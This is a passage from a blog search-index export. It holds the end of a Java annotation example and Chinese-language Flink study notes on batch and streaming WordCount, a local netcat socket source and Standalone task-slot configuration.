class="title">void</span> <span class="title">setAge</span>(<span class="params"><span class="built_in">int</span> age</span>) &#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">age</span> = <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">String</span> <span class="title">getName</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">setName</span>(<span class="params">String name</span>) &#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">name</span> = <span class="title">name</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//类名的注解</span></span><br><span class="line"><span class="class">@<span class="title">Target</span>(<span class="params">value = &#123;ElementType.TYPE&#125;</span>)</span></span><br><span class="line"><span class="class">@<span class="title">Retention</span>(<span class="params">RetentionPolicy.RUNTIME</span>)</span></span><br><span class="line"><span class="class">@<span class="title">interface</span> <span class="title">TableXy</span>&#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">String</span> <span class="title">value</span>();</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//属性的注解</span></span><br><span class="line"><span class="class">@<span class="title">Target</span>(<span class="params">value = &#123;ElementType.FIELD&#125;</span>)</span></span><br><span class="line"><span class="class">@<span class="title">Retention</span>(<span class="params">RetentionPolicy.RUNTIME</span>)</span></span><br><span class="line"><span class="class">@<span class="title">interface</span> <span class="title">FieldXy</span>&#123;</span></span><br><span class="line"><span class="class">    <span class="title">String</span> <span class="title">columnName</span>();</span></span><br><span class="line"><span class="class">    <span class="title">String</span> <span class="title">type</span>();</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">length</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">输出结果</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">annotation</span>.<span class="title">TableXy</span>(<span class="params">value=db_student</span>)</span></span><br><span class="line"><span class="class"><span class="title">db_student</span></span></span><br><span class="line"><span class="class"><span class="title">columnName</span>：<span class="title">db_name</span>   <span class="title">type</span>：<span class="title">varchar</span>   <span class="title">length</span>：3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flink学习笔记</title>
      <link href="/2021/09/06/Flink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/09/06/Flink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.bilibili.com/video/BV1qy4y1q728">尚硅谷2021最新Java版Flink</a></p><p>下面笔记来源（尚硅谷公开资料、网络博客、个人小结）</p><p>中间会把自己认为较重要的点做做标记（下划线、加粗等）</p></blockquote><h3 id="Flink的特点"><a href="#Flink的特点" class="headerlink" title="Flink的特点"></a>Flink的特点</h3><ul><li> 事件驱动（Event-driven） </li><li> 基于流处理<br>一切皆由流组成，离线数据是有界的流；实时数据是一个没有界限的流。（有界流、无界流） </li><li>分层API <ul><li>越顶层越抽象，表达含义越简明，使用越方便</li><li>越底层越具体，表达能力越丰富，使用越灵活</li></ul></li></ul><h4 id="Flink-vs-Spark-Streaming"><a href="#Flink-vs-Spark-Streaming" class="headerlink" title="Flink vs Spark Streaming"></a>Flink vs Spark Streaming</h4><ul><li>数据模型 <ul><li>Spark采用RDD模型，spark streaming的DStream实际上也就是一组组小批数据RDD的集合</li><li>flink基本数据模型是数据流，以及事件（Event）序列</li></ul></li><li>运行时架构 <ul><li>spark是批计算，将DAG划分为不同的stage，一个完成后才可以计算下一个</li><li>flink是标准的流执行模式，一个事件在一个节点处理完后可以直接发往下一个节点处理</li></ul></li></ul><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><h4 id="批处理实现WordCount"><a href="#批处理实现WordCount" class="headerlink" title="批处理实现WordCount"></a>批处理实现WordCount</h4><blockquote><p><em>flink-streaming-scala_2.12 =&gt; org.apache.flink:flink-runtime_2.12:1.12.1 =&gt; com.typesafe.akka:akka-actor_2.12:2.5.21，akka就是用scala实现的。即使这里我们用java语言，还是用到了scala实现的包</em></p></blockquote><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Flink_Tutorial<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FlatMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.DataSet;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.ExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/29 10:46 PM</span></span><br><span class="line"><span class="comment"> * 批处理 wordcount</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    ExecutionEnvironment env = ExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件中读取数据</span></span><br><span class="line">    String inputPath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/hello.txt&quot;</span>;</span><br><span class="line">    DataSet&lt;String&gt; inputDataSet = env.readTextFile(inputPath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对数据集进行处理，按空格分词展开，转换成(word, 1)二元组进行统计</span></span><br><span class="line">    <span class="comment">// 按照第一个位置的word分组</span></span><br><span class="line">    <span class="comment">// 按照第二个位置上的数据求和</span></span><br><span class="line">    DataSet&lt;Tuple2&lt;String, Integer&gt;&gt; resultSet = inputDataSet.flatMap(<span class="keyword">new</span> MyFlatMapper())</span><br><span class="line">      .groupBy(<span class="number">0</span>)</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    resultSet.print();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义类，实现FlatMapFunction接口</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFlatMapper</span> <span class="keyword">implements</span> <span class="title">FlatMapFunction</span>&lt;<span class="title">String</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String s, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 按空格分词</span></span><br><span class="line">      String[] words = s.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">      <span class="comment">// 遍历所有word，包成二元组输出</span></span><br><span class="line">      <span class="keyword">for</span> (String str : words) &#123;</span><br><span class="line">        out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(str, <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(scala,1)</span><br><span class="line">(flink,1)</span><br><span class="line">(world,1)</span><br><span class="line">(hello,4)</span><br><span class="line">(and,1)</span><br><span class="line">(fine,1)</span><br><span class="line">(how,1)</span><br><span class="line">(spark,1)</span><br><span class="line">(you,3)</span><br><span class="line">(are,1)</span><br><span class="line">(thank,1)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/qq_41398614/article/details/107553604">解决 Flink 升级1.11 报错 No ExecutorFactory found to execute the application</a></p></blockquote><h4 id="流处理实现WordCount"><a href="#流处理实现WordCount" class="headerlink" title="流处理实现WordCount"></a>流处理实现WordCount</h4><p>在2.1批处理的基础上，新建一个类进行改动。</p><ul><li> 批处理=&gt;几组或所有数据到达后才处理；流处理=&gt;有数据来就直接处理，不等数据堆叠到一定数量级 </li><li> <strong>这里不像批处理有groupBy =&gt; 所有数据统一处理，而是用流处理的keyBy =&gt; 每一个数据都对key进行hash计算，进行类似分区的操作，来一个数据就处理一次，所有中间过程都有输出！</strong> </li><li> <strong>并行度：开发环境的并行度默认就是计算机的CPU逻辑核数</strong> </li></ul><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.client.program.StreamContextEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/29 11:13 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建流处理执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamContextEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 设置并行度，默认值 = 当前计算机的CPU逻辑核数（设置成1即单线程处理）</span></span><br><span class="line">        <span class="comment">// env.setMaxParallelism(32);</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">// 从文件中读取数据</span></span><br><span class="line">        String inputPath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/hello.txt&quot;</span>;</span><br><span class="line">        DataStream&lt;String&gt; inputDataStream = env.readTextFile(inputPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 基于数据流进行转换计算</span></span><br><span class="line">        DataStream&lt;Tuple2&lt;String,Integer&gt;&gt; resultStream = inputDataStream.flatMap(<span class="keyword">new</span> WordCount.MyFlatMapper())</span><br><span class="line">                .keyBy(item-&gt;item.f0)</span><br><span class="line">                .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行任务</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><p><em>这里因为是流处理，所以所有中间过程都会被输出，前面的序号就是并行执行任务的线程编号。</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">9&gt;</span><span class="bash"> (world,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,1)</span></span><br><span class="line"><span class="meta">8&gt;</span><span class="bash"> (are,1)</span></span><br><span class="line"><span class="meta">10&gt;</span><span class="bash"> (you,1)</span></span><br><span class="line"><span class="meta">11&gt;</span><span class="bash"> (how,1)</span></span><br><span class="line"><span class="meta">6&gt;</span><span class="bash"> (thank,1)</span></span><br><span class="line"><span class="meta">9&gt;</span><span class="bash"> (fine,1)</span></span><br><span class="line"><span class="meta">10&gt;</span><span class="bash"> (you,2)</span></span><br><span class="line"><span class="meta">10&gt;</span><span class="bash"> (you,3)</span></span><br><span class="line"><span class="meta">15&gt;</span><span class="bash"> (and,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,2)</span></span><br><span class="line"><span class="meta">13&gt;</span><span class="bash"> (flink,1)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (spark,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,3)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (scala,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,4)</span></span><br></pre></td></tr></table></figure><pre><code>这里`env.execute();`之前的代码，可以理解为是在定义任务，只有执行`env.execute()`后，Flink才把前面的代码片段当作一个任务整体（每个线程根据这个任务操作，并行处理流数据）。</code></pre><h4 id="流式数据源测试"><a href="#流式数据源测试" class="headerlink" title="流式数据源测试"></a>流式数据源测试</h4><ol><li><p> 通过<code>nc -lk &lt;port&gt;</code>打开一个socket服务，用于模拟实时的流数据  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p> 代码修改inputStream的部分  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.client.program.StreamContextEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/29 11:13 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建流处理执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamContextEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置并行度，默认值 = 当前计算机的CPU逻辑核数（设置成1即单线程处理）</span></span><br><span class="line">        <span class="comment">// env.setMaxParallelism(32);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件中读取数据</span></span><br><span class="line"><span class="comment">//        String inputPath = &quot;/tmp/Flink_Tutorial/src/main/resources/hello.txt&quot;;</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; inputDataStream = env.readTextFile(inputPath);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从socket文本流读取数据</span></span><br><span class="line">        DataStream&lt;String&gt; inputDataStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 基于数据流进行转换计算</span></span><br><span class="line">        DataStream&lt;Tuple2&lt;String,Integer&gt;&gt; resultStream = inputDataStream.flatMap(<span class="keyword">new</span> WordCount.MyFlatMapper())</span><br><span class="line">                .keyBy(item-&gt;item.f0)</span><br><span class="line">                .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行任务</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在本地开启的socket中输入数据，观察IDEA的console输出。<br> 本人测试后发现，同一个字符串，前面输出的编号是一样的，因为key =&gt; hashcode,同一个key的hash值固定，分配给相对应的线程处理。 </p></li></ol><h3 id="Flink部署"><a href="#Flink部署" class="headerlink" title="Flink部署"></a>Flink部署</h3><h4 id="Standalone模式"><a href="#Standalone模式" class="headerlink" title="Standalone模式"></a>Standalone模式</h4><blockquote><p><a href="https://blog.csdn.net/qq_39657909/article/details/105823127">Flink任务调度原理之TaskManager 与Slots</a>    &lt;=    下面内容出自该博文</p></blockquote><ol><li>Flink 中每一个 TaskManager 都是一个JVM进程，它可能会在独立的线程上执行一个或多个 subtask</li><li>为了控制一个 TaskManager 能接收多少个 task， TaskManager 通过 task slot 来进行控制（一个 TaskManager 至少有一个 slot）</li><li>每个task slot表示TaskManager拥有资源的一个固定大小的子集。假如一个TaskManager有三个slot，那么它会将其管理的内存分成三份给各个slot(注：这里不会涉及CPU的隔离，slot仅仅用来隔离task的受管理内存)</li><li>可以通过调整task slot的数量去自定义subtask之间的隔离方式。如一个TaskManager一个slot时，那么每个task group运行在独立的JVM中。而<strong>当一个TaskManager多个slot时，多个subtask可以共同享有一个JVM,而在同一个JVM进程中的task将共享TCP连接和心跳消息，也可能共享数据集和数据结构，从而减少每个task的负载</strong>。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200428203404161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjU3OTA5,size_16,color_FFFFFF,t_70###pic_center###id=rthw9&originHeight=229&originWidth=682&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200428205219327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjU3OTA5,size_16,color_FFFFFF,t_70###pic_center###id=sIIUo&originHeight=331&originWidth=724&originalType=binary&ratio=1&status=done&style=none"></p><ol><li>默认情况下，Flink 允许子任务共享 slot，即使它们是不同任务的子任务（前提是它们来自同一个job）。 这样的结果是，一个 slot 可以保存作业的整个管道。</li><li>Task Slot 是静态的概念，是指 TaskManager 具有的并发执行能力，可以通过参数taskmanager.numberOfTaskSlots进行配置；而并行度parallelism是动态概念，即TaskManager运行程序时实际使用的并发能力，可以通过参数parallelism.default进行配置。<br>举例：如果总共有3个TaskManager,每一个TaskManager中分配了3个TaskSlot,也就是每个TaskManager可以接收3个task,这样我们总共可以接收9个TaskSot。但是如果我们设置parallelism.default=1，那么当程序运行时9个TaskSlot将只有1个运行，8个都会处于空闲状态，所以要学会合理设置并行度！具体图解如下：<br><img src="https://img-blog.csdnimg.cn/20200902165040619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjU3OTA5,size_16,color_FFFFFF,t_70###pic_center###id=s1OUN&originHeight=1022&originWidth=658&originalType=binary&ratio=1&status=done&style=none"></li></ol><p><code>conf/flink-conf.yaml</code>配置文件中</p><ul><li><code>taskmanager.numberOfTaskSlots</code></li><li><code>parallelism.default</code></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### The number of task slots that each TaskManager offers. Each slot runs one parallel pipeline.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">taskmanager.numberOfTaskSlots:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### The parallelism used for programs that did not specify and other parallelism.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">parallelism.default:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>注：<strong>Flink存储State用的是堆外内存</strong>，所以web UI里<code>JVM Heap Size</code>和<code>Flink Managed MEM</code>是两个分开的值。</p><h5 id="Web-UI提交job"><a href="#Web-UI提交job" class="headerlink" title="Web UI提交job"></a>Web UI提交job</h5><blockquote><p><a href="https://blog.csdn.net/qq_37142346/article/details/91385333">Flink Savepoint简单介绍</a></p></blockquote><p>启动Flink后，可以在Web UI的<code>Submit New Job</code>提交jar包，然后指定Job参数。</p><ul><li> Entry 